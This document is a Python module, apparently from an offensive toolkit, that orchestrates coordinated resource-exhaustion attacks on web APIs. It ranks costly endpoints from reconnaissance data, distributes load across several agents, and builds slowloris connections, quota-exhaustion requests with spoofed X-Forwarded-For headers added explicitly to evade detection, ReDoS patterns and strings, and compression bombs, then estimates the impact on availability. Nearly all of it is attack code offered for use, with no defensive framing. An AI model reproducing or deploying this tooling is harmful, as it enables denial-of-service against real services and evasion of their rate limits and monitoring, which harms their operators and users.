"""
Tier 3: Coordinated Resource Exhaustion
API abuse and resource exhaustion via coordinated attacks on expensive endpoints.
Includes slowloris, compression bombs, ReDoS, and intelligent load distribution.
"""

import hashlib
import zlib
import gzip
import io
import time
import random
import re
from enum import Enum
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Callable
from collections import defaultdict


@dataclass
class ExhaustionTarget:
    """Represents a target endpoint for resource exhaustion."""
    endpoint: str
    method: str = "GET"
    estimated_cost_ms: float = 0.0
    rate_limit: Optional[int] = None
    headers: Dict[str, str] = field(default_factory=dict)
    body_template: Optional[str] = None
    computation_type: str = ""
    detected_vulnerability: Optional[str] = None
    priority: int = 1


class ComputationType(Enum):
    """Types of computation-heavy operations."""
    WILDCARD_SEARCH = "wildcard_search"
    REPORT_GENERATION = "report_generation"
    FILE_CONVERSION = "file_conversion"
    REGEX_EVALUATION = "regex_evaluation"
    RECURSIVE_QUERY = "recursive_query"
    SORTING_OPERATION = "sorting_operation"
    AGGREGATION = "aggregation"
    TRANSCODING = "transcoding"


EXPENSIVE_PATTERNS = {
    "search_wildcard": {
        "description": "Wildcard searches that scan full tables",
        "indicators": ["LIKE '%", "GLOB '*", "CONTAINS", "MATCH"],
        "cost_multiplier": 100,
        "example_payloads": ["search=%", "q=*", "filter=*.*"]
    },
    "report_generation": {
        "description": "Complex aggregation queries and report generation",
        "indicators": ["GROUP BY", "aggregate", "sum(", "count(", "export"],
        "cost_multiplier": 500,
        "example_payloads": ["action=generate_report&months=60", "export=all&format=pdf"]
    },
    "file_conversion": {
        "description": "PDF/image processing and format conversion endpoints",
        "indicators": ["convert", "pdf", "image", "transcode", "compress"],
        "cost_multiplier": 300,
        "example_payloads": ["convert_to=pdf&size=4096", "format=image&resolution=8192"]
    },
    "regex_evaluation": {
        "description": "Input validated with complex regex patterns (ReDoS vulnerable)",
        "indicators": ["validate", "match", "test", "regex", "pattern"],
        "cost_multiplier": 1000,
        "example_payloads": ["pattern=(a+)+$", "test=xxxxxxxxxxxxxxxxxxxxx"]
    },
    "recursive_query": {
        "description": "GraphQL deep nesting or recursive database queries",
        "indicators": ["query", "graphql", "depth", "recursive", "fragment"],
        "cost_multiplier": 200,
        "example_payloads": ["depth=100", "nesting_level=50"]
    }
}


class CoordinatedExhaustion:
    """Orchestrates coordinated resource exhaustion attacks."""

    def __init__(self):
        self.targets: List[ExhaustionTarget] = []
        self.load_plans: Dict[str, Any] = {}
        self.agent_configs: Dict[int, Dict[str, Any]] = {}

    def identify_expensive_endpoints(self, recon_data: List[Dict[str, Any]]) -> List[ExhaustionTarget]:
        """
        Identify computation-heavy endpoints from reconnaissance data.
        
        Args:
            recon_data: List of endpoint information from reconnaissance
            
        Returns:
            List of identified expensive endpoints ranked by cost
        """
        targets = []
        
        for endpoint_info in recon_data:
            endpoint = endpoint_info.get('endpoint', '')
            method = endpoint_info.get('method', 'GET')
            response_time = endpoint_info.get('response_time_ms', 10)
            
            # Calculate cost based on response time and patterns
            cost = response_time
            computation_type = ""
            vulnerability = None
            
            # Check for expensive patterns
            for pattern_key, pattern_info in EXPENSIVE_PATTERNS.items():
                for indicator in pattern_info['indicators']:
                    if indicator.lower() in endpoint.lower():
                        cost *= pattern_info['cost_multiplier']
                        computation_type = pattern_key
                        break
            
            # Check for rate limiting
            rate_limit = endpoint_info.get('rate_limit')
            
            if cost > 50:  # Only include expensive endpoints
                target = ExhaustionTarget(
                    endpoint=endpoint,
                    method=method,
                    estimated_cost_ms=cost,
                    rate_limit=rate_limit,
                    headers=endpoint_info.get('headers', {}),
                    body_template=endpoint_info.get('body_template'),
                    computation_type=computation_type,
                    detected_vulnerability=vulnerability,
                    priority=int(cost / 50)  # Higher priority for more expensive
                )
                targets.append(target)
        
        # Sort by cost
        targets.sort(key=lambda x: x.estimated_cost_ms, reverse=True)
        self.targets = targets
        
        return targets

    def generate_load_plan(self, targets: List[ExhaustionTarget], agent_count: int = 4) -> Dict[str, Any]:
        """
        Generate distributed load plan across multiple agents.
        
        Args:
            targets: List of targets to exhaust
            agent_count: Number of agents to distribute load across
            
        Returns:
            Load plan with per-agent assignments
        """
        load_plan = {
            'total_agents': agent_count,
            'targets': [],
            'agent_assignments': {},
            'expected_duration_ms': 0
        }
        
        # Distribute targets across agents
        for agent_id in range(agent_count):
            load_plan['agent_assignments'][agent_id] = {
                'targets': [],
                'request_rate': 10,
                'concurrent_connections': 5
            }
        
        # Assign targets to agents (round-robin by cost)
        sorted_targets = sorted(targets, key=lambda x: x.estimated_cost_ms, reverse=True)
        
        for idx, target in enumerate(sorted_targets):
            agent_id = idx % agent_count
            load_plan['agent_assignments'][agent_id]['targets'].append({
                'endpoint': target.endpoint,
                'method': target.method,
                'cost': target.estimated_cost_ms
            })
            
            # Estimate total duration
            requests_needed = max(1, 1000 / (target.estimated_cost_ms / 1000))
            load_plan['expected_duration_ms'] += target.estimated_cost_ms * requests_needed
        
        load_plan['expected_duration_ms'] = int(load_plan['expected_duration_ms'] / agent_count)
        self.load_plans[f"plan_{int(time.time())}"] = load_plan
        
        return load_plan

    def generate_slowloris_payloads(self, target: str, connection_count: int = 100) -> List[Dict[str, Any]]:
        """
        Generate Slowloris attack payloads (slow HTTP headers, incomplete requests).
        
        Args:
            target: Target URL/endpoint
            connection_count: Number of concurrent connections
            
        Returns:
            List of slowloris-style request configurations
        """
        payloads = []
        
        for conn_id in range(connection_count):
            # Slowloris header - never complete the request
            payload = {
                'connection_id': conn_id,
                'method': 'GET',
                'target': target,
                'headers': {
                    'User-Agent': f'Mozilla/5.0 (compatible; Agent{conn_id})',
                    'Accept': '*/*',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                },
                'incomplete': True,  # Never send final CRLF to complete request
                'keep_alive_interval_ms': random.randint(5000, 15000),  # Send keep-alive headers slowly
                'keep_alive_headers': [
                    f'X-Session-Token: {hashlib.md5(f"session{conn_id}".encode()).hexdigest()}',
                    f'X-Request-ID: {conn_id}'
                ]
            }
            payloads.append(payload)
        
        return payloads

    def generate_api_quota_exhaustion(self, target: ExhaustionTarget) -> List[Dict[str, Any]]:
        """
        Generate requests to strategically hit rate limits.
        
        Args:
            target: Target endpoint with rate limit info
            
        Returns:
            List of quota-exhausting request payloads
        """
        payloads = []
        
        if not target.rate_limit:
            target.rate_limit = 100  # Default assumption
        
        # Create requests to exhaust quota
        requests_to_send = target.rate_limit + 10
        
        for req_id in range(requests_to_send):
            payload = {
                'request_id': req_id,
                'endpoint': target.endpoint,
                'method': target.method,
                'headers': target.headers.copy() if target.headers else {},
                'body': target.body_template if target.body_template else None,
                'timestamp': time.time() + (req_id * 0.1)
            }
            
            # Add randomization to evade detection
            payload['headers']['X-Random-ID'] = f"{random.randint(100000, 999999)}"
            payload['headers']['X-Forwarded-For'] = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
            
            payloads.append(payload)
        
        return payloads

    def generate_regex_dos(self, patterns: Optional[List[str]] = None) -> List[str]:
        """
        Generate ReDoS (Regular Expression Denial of Service) payloads.
        
        Args:
            patterns: Optional custom regex patterns to exploit
            
        Returns:
            List of ReDoS payloads
        """
        # Classic ReDoS patterns that cause catastrophic backtracking
        default_patterns = [
            # Exponential backtracking
            "(a+)+$",
            "(a*)*$",
            "(a|a)*$",
            "(a|ab)*$",
            
            # Nested quantifiers
            "([a-zA-Z]+)*$",
            "(x+x+)+y$",
            "(a|a)*b$",
            "(.*a){x}b$",
            
            # Email validation redos
            "^([a-zA-Z0-9]+([-._]?[a-zA-Z0-9]+)*)@([a-zA-Z0-9]+([-.]?[a-zA-Z0-9]+)*)(\\.[a-zA-Z]{2,})+$",
            
            # URL validation redos
            "^(https?|ftp)://[^/]+(/.*)?$",
        ]
        
        patterns_to_use = patterns if patterns else default_patterns
        
        # Generate payload strings that trigger worst-case behavior
        payloads = []
        test_strings = [
            "a" * 30,
            "x" * 35,
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab",
            "email@domain.com" * 5,
        ]
        
        for pattern in patterns_to_use:
            for test_str in test_strings:
                payloads.append({
                    'pattern': pattern,
                    'test_string': test_str,
                    'expected_behavior': 'catastrophic_backtracking'
                })
        
        return [p['test_string'] for p in payloads]

    def generate_compression_bomb(self, size_kb: int = 10) -> bytes:
        """
        Generate a compression bomb (small compressed data that expands hugely).
        
        Args:
            size_kb: Desired uncompressed size in KB
            
        Returns:
            Compressed data payload
        """
        # Create highly compressible data
        uncompressed_size = size_kb * 1024
        data = b'A' * uncompressed_size
        
        # Compress with high ratio
        compressed = zlib.compress(data, level=9)
        
        # Additional gzip compression
        bio = io.BytesIO()
        with gzip.GzipFile(fileobj=bio, mode='wb') as gz:
            gz.write(data)
        
        compressed_gzip = bio.getvalue()
        
        # Return the smaller of the two
        return compressed if len(compressed) < len(compressed_gzip) else compressed_gzip

    def estimate_impact(self, target: ExhaustionTarget, request_count: int) -> Dict[str, Any]:
        """
        Estimate impact of exhaustion attack on target.
        
        Args:
            target: Target endpoint
            request_count: Number of requests in attack
            
        Returns:
            Impact estimation
        """
        total_time_ms = target.estimated_cost_ms * request_count
        
        # Estimate CPU/memory usage
        cpu_impact = min(100, (request_count * target.priority) / 10)
        memory_impact = min(100, (request_count * target.estimated_cost_ms) / 1000)
        
        return {
            'total_time_ms': total_time_ms,
            'cpu_impact_percent': cpu_impact,
            'memory_impact_percent': memory_impact,
            'estimated_availability_impact': 'high' if cpu_impact > 80 else 'medium' if cpu_impact > 50 else 'low'
        }


class LoadDistributionOptimizer:
    """Optimizes load distribution across multiple agents."""

    def __init__(self):
        self.agent_capacity: Dict[int, float] = {}
        self.target_allocation: Dict[int, List[ExhaustionTarget]] = defaultdict(list)

    def calculate_optimal_distribution(self, targets: List[ExhaustionTarget], agents: int) -> Dict[int, List[ExhaustionTarget]]:
        """
        Calculate optimal distribution of targets across agents.
        
        Args:
            targets: List of targets to distribute
            agents: Number of agents available
            
        Returns:
            Mapping of agent ID to assigned targets
        """
        # Initialize agent capacity
        for agent_id in range(agents):
            self.agent_capacity[agent_id] = 0
        
        # Sort targets by cost (descending)
        sorted_targets = sorted(targets, key=lambda x: x.estimated_cost_ms, reverse=True)
        
        # Greedy allocation: assign each target to least-loaded agent
        for target in sorted_targets:
            min_agent = min(self.agent_capacity.keys(), key=lambda x: self.agent_capacity[x])
            self.target_allocation[min_agent].append(target)
            self.agent_capacity[min_agent] += target.estimated_cost_ms
        
        return dict(self.target_allocation)


if __name__ == "__main__":
    # Example usage
    exhaustion = CoordinatedExhaustion()
    
    # Sample reconnaissance data
    recon_data = [
        {'endpoint': '/api/search', 'method': 'POST', 'response_time_ms': 50},
        {'endpoint': '/report/generate', 'method': 'POST', 'response_time_ms': 100},
        {'endpoint': '/convert/pdf', 'method': 'POST', 'response_time_ms': 150},
        {'endpoint': '/validate', 'method': 'GET', 'response_time_ms': 10},
        {'endpoint': '/query', 'method': 'POST', 'response_time_ms': 75, 'rate_limit': 100},
    ]
    
    # Identify expensive endpoints
    targets = exhaustion.identify_expensive_endpoints(recon_data)
    print(f"Found {len(targets)} expensive endpoints")
    
    # Generate load plan
    if targets:
        plan = exhaustion.generate_load_plan(targets, agent_count=4)
        print(f"Load plan created for {plan['total_agents']} agents")
        print(f"Expected duration: {plan['expected_duration_ms']}ms")
        
        # Generate slowloris
        slowloris = exhaustion.generate_slowloris_payloads('/api/endpoint', 10)
        print(f"Generated {len(slowloris)} slowloris connections")
        
        # Generate ReDoS
        redos = exhaustion.generate_regex_dos()
        print(f"Generated {len(redos)} ReDoS payloads")
        
        # Compression bomb
        bomb = exhaustion.generate_compression_bomb(5)
        print(f"Compression bomb size: {len(bomb)} bytes")
